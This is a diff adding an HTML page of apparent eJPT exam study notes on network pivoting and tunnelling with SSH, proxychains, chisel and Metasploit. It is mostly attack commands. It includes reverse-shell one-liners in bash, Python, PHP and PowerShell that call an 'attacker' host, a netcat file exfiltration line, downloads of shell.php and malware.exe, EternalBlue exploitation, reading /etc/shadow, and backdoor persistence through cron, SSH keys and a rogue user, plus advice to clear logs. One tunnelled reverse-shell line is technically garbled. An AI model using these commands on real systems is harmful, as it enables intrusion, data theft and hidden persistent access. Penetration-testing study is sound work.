@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>01_pivoting_tunneling.md</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            color: #2c3e50;
+            margin-top: 24px;
+            margin-bottom: 16px;
+        }
+        h1 { border-bottom: 2px solid #0066cc; padding-bottom: 10px; }
+        code {
+            background: #f4f4f4;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            color: #c7254e;
+        }
+        pre {
+            background: #f5f5f5;
+            color: #333;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            line-height: 1.4;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+        }
+        pre code {
+            background: transparent;
+            color: #333;
+            padding: 0;
+        }
+        .codehilite {
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 0;
+            margin: 15px 0;
+        }
+        .codehilite pre {
+            margin: 0;
+            border: none;
+            background: #f5f5f5;
+            padding: 15px;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 15px 0;
+        }
+        table th, table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        table th {
+            background-color: #f2f2f2;
+            font-weight: bold;
+        }
+        blockquote {
+            border-left: 4px solid #0066cc;
+            margin: 15px 0;
+            padding-left: 15px;
+            color: #666;
+        }
+        a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        @media print {
+            body { margin: 0; padding: 10px; }
+            pre { page-break-inside: avoid; }
+            table { page-break-inside: avoid; }
+        }
+    </style>
+    <!-- Anime Vibes CSS Framework -->
+    <link rel="stylesheet" href="anime-vibes.css">
+    </head>
+<body>
+    <h1 id="phase-4-pivoting-tunnelling-network-lateral-movement">PHASE 4: PIVOTING &amp; TUNNELLING - Network Lateral Movement</h1>
+
+<hr />
+
+<h1 id="ssh-tunneling-port-forwarding-socks-proxy">SSH TUNNELING - Port Forwarding &amp; SOCKS Proxy</h1>
+
+<h2 id="overview">Overview</h2>
+
+<p>SSH tunneling allows you to forward ports and create proxies through compromised systems to access internal networks. Critical for moving laterally through networks.</p>
+
+<hr />
+
+<h2 id="installation-setup">Installation &amp; Setup</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># SSH usually pre-installed on Linux systems</span>
+which<span class="w"> </span>ssh
+ssh<span class="w"> </span>-V<span class="w">  </span><span class="c1"># Verify version</span>
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="common-use-cases">Common Use Cases</h2>
+
+<h3 id="1-local-port-forwarding-l">1. <strong>Local Port Forwarding (-L)</strong></h3>
+
+<p>Forward local port to remote service.</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Forward local 9999 to remote service</span>
+ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">9999</span>:192.168.1.20:80<span class="w"> </span>user@192.168.1.50
+
+<span class="c1"># Now access: http://localhost:9999</span>
+<span class="c1"># Connects to: 192.168.1.20:80 through 192.168.1.50</span>
+</code></pre>
+</div>
+
+<h3 id="2-remote-port-forwarding-r">2. <strong>Remote Port Forwarding (-R)</strong></h3>
+
+<p>Forward remote port to local service.</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Forward remote port back to local</span>
+ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">9999</span>:localhost:3306<span class="w"> </span>user@192.168.1.50
+
+<span class="c1"># Remote can access: localhost:9999</span>
+<span class="c1"># Connects to your: localhost:3306 (MySQL)</span>
+</code></pre>
+</div>
+
+<h3 id="3-dynamic-port-forwarding-d">3. <strong>Dynamic Port Forwarding (-D)</strong></h3>
+
+<p>Create SOCKS proxy through SSH.</p>
+
+<div class="codehilite">
+<pre><span></span><code>ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@192.168.1.50
+
+<span class="c1"># Now use proxychains or other tools through port 9050</span>
+<span class="c1"># All traffic routed through compromised system</span>
+</code></pre>
+</div>
+
+<h3 id="4-combined-tunneling">4. <strong>Combined Tunneling</strong></h3>
+
+<p>Multiple tunnels in one command.</p>
+
+<div class="codehilite">
+<pre><span></span><code>ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">9999</span>:192.168.1.20:80<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-L<span class="w"> </span><span class="m">9888</span>:192.168.1.21:3306<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>user@192.168.1.50
+
+<span class="c1"># Two ports forwarded simultaneously</span>
+</code></pre>
+</div>
+
+<h3 id="5-background-tunnel">5. <strong>Background Tunnel</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">9999</span>:target:80<span class="w"> </span>user@pivot<span class="w"> </span>-N<span class="w"> </span>-f
+<span class="c1"># -N: No shell, -f: Background</span>
+<span class="c1"># Tunnel stays active in background</span>
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="real-world-example">Real-World Example</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Scenario: Compromised system on network edge</span>
+
+<span class="c1"># Step 1: Establish initial SSH access</span>
+ssh<span class="w"> </span>user@192.168.1.50<span class="w">  </span><span class="c1"># Compromised system</span>
+
+<span class="c1"># Step 2: From compromised system, discover internal network</span>
+ifconfig
+arp<span class="w"> </span>-a
+<span class="c1"># Finds: Internal MySQL server on 192.168.1.20:3306</span>
+
+<span class="c1"># Step 3: On attacker machine, setup tunnel</span>
+ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">3307</span>:192.168.1.20:3306<span class="w"> </span>user@192.168.1.50
+
+<span class="c1"># Step 4: Access MySQL locally</span>
+mysql<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p
+<span class="c1"># Connects to internal MySQL through tunnel!</span>
+</code></pre>
+</div>
+
+<hr />
+
+<hr />
+
+<h1 id="proxychains-route-tools-through-proxy">PROXYCHAINS - Route Tools Through Proxy</h1>
+
+<h2 id="overview-2">Overview</h2>
+
+<p><strong>Proxychains</strong> allows any tool to work through SOCKS proxy (often created via SSH tunnel). Lets you scan/attack internal networks from outside.</p>
+
+<hr />
+
+<h2 id="installation-setup-2">Installation &amp; Setup</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># CachyOS:</span>
+sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>proxychains-ng
+
+<span class="c1"># Configuration:</span>
+sudo<span class="w"> </span>nano<span class="w"> </span>/etc/proxychains.conf
+<span class="c1"># Add at end:</span>
+<span class="c1"># socks5 127.0.0.1 9050</span>
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="common-use-cases-2">Common Use Cases</h2>
+
+<h3 id="1-scan-internal-network">1. <strong>Scan Internal Network</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Setup SOCKS proxy first:</span>
+ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@pivot<span class="w"> </span><span class="p">&amp;</span>
+
+<span class="c1"># Then scan through proxy:</span>
+proxychains<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>,443<span class="w"> </span><span class="m">192</span>.168.1.20
+proxychains<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">192</span>.168.1.0/24
+</code></pre>
+</div>
+
+<h3 id="2-web-reconnaissance">2. <strong>Web Reconnaissance</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Setup tunnel:</span>
+ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@192.168.1.50<span class="w"> </span><span class="p">&amp;</span>
+
+<span class="c1"># Use proxychains with tools:</span>
+proxychains<span class="w"> </span>curl<span class="w"> </span>http://192.168.1.20
+proxychains<span class="w"> </span>curl<span class="w"> </span>-v<span class="w"> </span>http://192.168.1.21
+</code></pre>
+</div>
+
+<h3 id="3-enumerate-services">3. <strong>Enumerate Services</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>proxychains<span class="w"> </span>netcat<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.20<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">3306</span>
+proxychains<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//192.168.1.20<span class="w"> </span>-N
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="real-world-example-2">Real-World Example</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># After compromising first system:</span>
+
+<span class="c1"># Step 1: Create SOCKS proxy</span>
+ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>admin@192.168.1.50<span class="w"> </span>-N<span class="w"> </span>-f
+
+<span class="c1"># Step 2: Scan internal network through proxy</span>
+proxychains<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">192</span>.168.1.0/24
+
+<span class="c1"># Step 3: Found MySQL on 192.168.1.20:3306</span>
+proxychains<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.20/page?id=1&quot;</span><span class="w"> </span>--dbs
+
+<span class="c1"># Step 4: Lateral movement complete!</span>
+</code></pre>
+</div>
+
+<hr />
+
+<hr />
+
+<h1 id="chisel-tcp-tunneling-no-ssh-required">CHISEL - TCP Tunneling (No SSH Required)</h1>
+
+<h2 id="overview-3">Overview</h2>
+
+<p><strong>Chisel</strong> creates TCP tunnels over HTTP/HTTPS. Useful when SSH is blocked or unavailable.</p>
+
+<hr />
+
+<h2 id="installation-setup-3">Installation &amp; Setup</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># CachyOS:</span>
+sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>chisel
+
+<span class="c1"># Or download:</span>
+wget<span class="w"> </span>https://github.com/jpillora/chisel/releases/latest
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="common-use-cases-3">Common Use Cases</h2>
+
+<h3 id="1-setup-server-on-attacker">1. <strong>Setup Server (on Attacker)</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--reverse
+<span class="c1"># Server listening on port 8080</span>
+</code></pre>
+</div>
+
+<h3 id="2-connect-client-on-target">2. <strong>Connect Client (on Target)</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code>chisel<span class="w"> </span>client<span class="w"> </span>http://attacker_ip:8080<span class="w"> </span>R:socks
+<span class="c1"># Creates SOCKS proxy back to attacker</span>
+</code></pre>
+</div>
+
+<h3 id="3-port-forwarding">3. <strong>Port Forwarding</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Attacker:</span>
+chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--reverse
+
+<span class="c1"># Target:</span>
+chisel<span class="w"> </span>client<span class="w"> </span>http://attacker:8080<span class="w"> </span>R:3307:192.168.1.20:3306
+<span class="c1"># Now attacker can: mysql -h localhost:3307</span>
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="real-world-example-3">Real-World Example</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># When SSH is blocked but HTTP is allowed:</span>
+
+<span class="c1"># Step 1: On attacker machine</span>
+chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--reverse
+
+<span class="c1"># Step 2: On compromised target</span>
+chisel<span class="w"> </span>client<span class="w"> </span>http://attacker:8080<span class="w"> </span>R:socks
+
+<span class="c1"># Step 3: On attacker, use proxychains</span>
+proxychains<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">192</span>.168.1.0/24
+<span class="c1"># Same effect as SSH tunnel, but through HTTP!</span>
+</code></pre>
+</div>
+
+<hr />
+
+<hr />
+
+<h1 id="metasploit-pivoting-advanced-routing">METASPLOIT PIVOTING - Advanced Routing</h1>
+
+<h2 id="overview-4">Overview</h2>
+
+<p>Metasploit allows pivoting through compromised systems using meterpreter shells.</p>
+
+<hr />
+
+<h2 id="common-commands">Common Commands</h2>
+
+<h3 id="1-setup-routes">1. <strong>Setup Routes</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># In msfconsole after getting meterpreter:</span>
+route<span class="w"> </span>add<span class="w"> </span><span class="m">192</span>.168.1.0<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w"> </span><span class="m">1</span>
+<span class="c1"># Routes traffic through session 1</span>
+
+<span class="c1"># View routes:</span>
+route<span class="w"> </span>print
+</code></pre>
+</div>
+
+<h3 id="2-scan-through-session">2. <strong>Scan Through Session</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Setup route first</span>
+route<span class="w"> </span>add<span class="w"> </span><span class="m">192</span>.168.1.0<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w"> </span><span class="o">[</span>session_id<span class="o">]</span>
+
+<span class="c1"># Then scan:</span>
+nmap<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-sV
+<span class="c1"># Scans through meterpreter session</span>
+</code></pre>
+</div>
+
+<h3 id="3-pivot-exploitation">3. <strong>Pivot Exploitation</strong></h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Use auxiliary/scanner/smb/smb_version through route</span>
+use<span class="w"> </span>auxiliary/scanner/smb/smb_version
+<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.100
+exploit
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="real-world-workflow">Real-World Workflow</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># After obtaining meterpreter shell:</span>
+
+<span class="c1"># Step 1: Check network from target</span>
+meterpreter&gt;<span class="w"> </span>ipconfig
+<span class="c1"># Finds: Internal network 10.0.0.0/24</span>
+
+<span class="c1"># Step 2: Add route</span>
+route<span class="w"> </span>add<span class="w"> </span><span class="m">10</span>.0.0.0<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w"> </span><span class="o">[</span>session_number<span class="o">]</span>
+
+<span class="c1"># Step 3: Exploit through route</span>
+use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
+<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">10</span>.0.0.50
+exploit
+
+<span class="c1"># Step 4: Obtain new meterpreter on internal network</span>
+<span class="c1"># Repeat process for complete network compromise</span>
+</code></pre>
+</div>
+
+<hr />
+
+<hr />
+
+<h1 id="phase-4-complete-workflow">PHASE 4 COMPLETE WORKFLOW</h1>
+
+<h2 id="network-pivoting-scenario">Network Pivoting Scenario</h2>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1">#  [Attacker] → [Compromised Pivot System] → [Internal Network]</span>
+
+<span class="c1"># Step 1: Initial Compromise (Pivot System)</span>
+<span class="c1"># Use Phase 1-2 tools to get shell on 192.168.1.50</span>
+
+<span class="c1"># Step 2: Reconnaissance from Compromised System</span>
+ssh<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w">  </span><span class="c1"># Access pivot</span>
+ifconfig<span class="w">  </span><span class="c1"># Check networks</span>
+arp<span class="w"> </span>-a<span class="w">    </span><span class="c1"># Discover internal systems</span>
+<span class="c1"># Finds: 10.0.0.0/24 network with active hosts</span>
+
+<span class="c1"># Step 3: Setup Tunnel from Attacker</span>
+ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@192.168.1.50<span class="w"> </span>-N<span class="w"> </span>-f
+
+<span class="c1"># Step 4: Configure Proxychains</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;socks5 127.0.0.1 9050&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/proxychains.conf
+
+<span class="c1"># Step 5: Scan Internal Network</span>
+proxychains<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.0.0.0/24
+<span class="c1"># Discovers: 10.0.0.100 (Windows Server)</span>
+
+<span class="c1"># Step 6: Exploit Internal Target</span>
+proxychains<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://10.0.0.100/app?id=1&quot;</span><span class="w"> </span>--dbs
+
+<span class="c1"># Step 7: Get Shell on Internal System</span>
+proxychains<span class="w"> </span>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/attacker/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+<span class="c1"># Step 8: Repeat on Further Systems</span>
+<span class="c1"># Chain multiple hops for complete network penetration</span>
+</code></pre>
+</div>
+
+<hr />
+
+<h1 id="phase-5-always-on-utilities">PHASE 5: ALWAYS-ON UTILITIES</h1>
+
+<hr />
+
+<h2 id="commonly-used-utilities-throughout-all-phases">Commonly Used Utilities (Throughout All Phases)</h2>
+
+<h3 id="system-commands">System Commands</h3>
+
+<div class="codehilite">
+<pre><span></span><code>whoami<span class="w">           </span><span class="c1"># Current user</span>
+id<span class="w">               </span><span class="c1"># User and group info</span>
+hostname<span class="w">         </span><span class="c1"># Machine name</span>
+uname<span class="w"> </span>-a<span class="w">         </span><span class="c1"># OS and kernel</span>
+ifconfig<span class="w"> </span>/<span class="w"> </span>ip<span class="w"> </span>addr<span class="w"> </span><span class="c1"># Network config</span>
+<span class="nb">pwd</span><span class="w">              </span><span class="c1"># Current directory</span>
+ls<span class="w"> </span>-la<span class="w">           </span><span class="c1"># List files</span>
+cat<span class="w"> </span>/etc/passwd<span class="w">  </span><span class="c1"># User accounts</span>
+cat<span class="w"> </span>/etc/shadow<span class="w">  </span><span class="c1"># Password hashes</span>
+sudo<span class="w"> </span>-l<span class="w">          </span><span class="c1"># Sudo permissions</span>
+</code></pre>
+</div>
+
+<h3 id="persistence-commands">Persistence Commands</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Add cron job:</span>
+<span class="o">(</span>crontab<span class="w"> </span>-l<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;* * * * * /tmp/backdoor.sh&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>crontab<span class="w"> </span>-
+
+<span class="c1"># Add SSH key:</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-rsa PUBLIC_KEY&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.ssh/authorized_keys
+
+<span class="c1"># Create backdoor user:</span>
+useradd<span class="w"> </span>-m<span class="w"> </span>-s<span class="w"> </span>/bin/bash<span class="w"> </span>backdoor
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;backdoor:password&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd
+</code></pre>
+</div>
+
+<h3 id="file-transfer">File Transfer</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># SCP:</span>
+scp<span class="w"> </span>file<span class="w"> </span>user@target:/tmp/
+
+<span class="c1"># Wget:</span>
+wget<span class="w"> </span>http://attacker/shell.php
+
+<span class="c1"># Curl:</span>
+curl<span class="w"> </span>-O<span class="w"> </span>http://attacker/malware.exe
+
+<span class="c1"># NC (Netcat):</span>
+cat<span class="w"> </span>file<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>attacker<span class="w"> </span><span class="m">4444</span>
+</code></pre>
+</div>
+
+<h3 id="reverse-shell-one-liners">Reverse Shell One-Liners</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Bash:</span>
+bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/attacker/port<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+<span class="c1"># Python:</span>
+python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket();s.connect((&quot;attacker&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
+
+<span class="c1"># PHP:</span>
+php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;attacker&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+
+<span class="c1"># Powershell:</span>
+powershell<span class="w"> </span>-NoP<span class="w"> </span>-NonI<span class="w"> </span>-W<span class="w"> </span>Hidden<span class="w"> </span>-Exec<span class="w"> </span>Bypass<span class="w"> </span>-Command<span class="w"> </span>New-Object<span class="w"> </span>System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&quot;attacker&quot;</span>,port<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span>...
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="key-takeaways-for-all-phases">Key Takeaways for All Phases</h2>
+
+<ol>
+<li><strong>Reconnaissance is Key</strong>: 80% of the work</li>
+<li><strong>Combine Tools</strong>: Output of one feeds to next</li>
+<li><strong>Document Everything</strong>: Screenshots, credentials, findings</li>
+<li><strong>Test Systematically</strong>: Don't randomly guess</li>
+<li><strong>Privilege Escalation is Critical</strong>: Can't complete eJPT without root</li>
+<li><strong>Pivot Through Networks</strong>: eJPT involves multiple systems</li>
+<li><strong>Maintain Access</strong>: Create backdoors before losing access</li>
+<li><strong>Cover Tracks</strong>: Clear logs if possible (blue team might be watching)</li>
+</ol>
+
+<hr />
+
+<h2 id="ejpt-exam-success-checklist">eJPT Exam Success Checklist</h2>
+
+<ul>
+<li>[ ] Full reconnaissance of all systems</li>
+<li>[ ] Identified all vulnerabilities</li>
+<li>[ ] Exploited at least 3-5 vulnerabilities  </li>
+<li>[ ] Escalated privileges on at least 2 systems</li>
+<li>[ ] Pivoted through network to additional targets</li>
+<li>[ ] Dumped all possible data (hashes, files, databases)</li>
+<li>[ ] Cracked at least some password hashes</li>
+<li>[ ] Created persistence/backdoors</li>
+<li>[ ] Full system compromise documented</li>
+<li>[ ] Professional report generated</li>
+</ul>
+
+<hr />
+
+<p><strong>Congratulations!</strong> You now have comprehensive notes covering all eJPT tools and techniques.</p>
+
+<p><strong>Next:</strong> Take a practice exam, then schedule your actual eJPT exam!</p>
+
+<hr />
+
+<p><strong>Last Updated</strong>: April 2026<br />
+<strong>Status</strong>: Phase 1-5 Complete<br />
+<strong>Total Notes</strong>: Comprehensive coverage of 20+ tools  </p>
+
+<p>Use these notes as your personal penetration testing playbook!</p>
+
+</body>
+</html>
